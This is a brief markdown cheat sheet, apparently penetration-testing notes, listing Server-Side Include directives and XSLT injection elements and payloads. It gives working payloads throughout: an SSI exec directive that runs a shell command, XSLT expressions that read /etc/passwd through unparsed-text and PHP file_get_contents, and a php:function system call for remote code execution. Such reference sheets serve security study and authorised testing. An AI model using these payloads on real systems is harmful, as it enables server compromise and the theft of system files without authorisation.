### **SSI Injection (Server-Side Includes)**

#### Directives

| Directive | Example |
| ----------------------- | ---------------------------------------------------- |
| Print variables | `<!--#printenv -->` |
| Change config | `<!--#config errmsg="Error!" -->` |
| Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
| Execute command | `<!--#exec cmd="whoami" -->` |
| Include web file | `<!--#include virtual="index.html" -->` |
| | |
| | |


### **XSLT Injection**

#### Elements

|Element|Description|
|---|---|
|`<xsl:template>`|Defines a template for a specific XML path via`match` attribute.|
|`<xsl:value-of>`|Extracts the value of an XML node specified in`select`.|
|`<xsl:for-each>`|Loops over XML nodes specified in`select`.|
|`<xsl:sort>`|Sorts elements by a node (`select`) and order (`order`).|
|`<xsl:if>`|Tests conditions on a node via`test` attribute.|

#### Injection Payloads

| Type | Example |
| -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Information Disclosure** | `<xsl:value-of select="system-property('xsl:version')" />` <br>`<xsl:value-of select="system-property('xsl:vendor')" />` <br>`<xsl:value-of select="system-property('xsl:vendor-url')" />` <br>`<xsl:value-of select="system-property('xsl:product-name')" />` <br>`<xsl:value-of select="system-property('xsl:product-version')" />` |
| **LFI** | `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />` <br>`<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />` |
| **RCE** | `<xsl:value-of select="php:function('system','id')" />` |
| | |
| | |
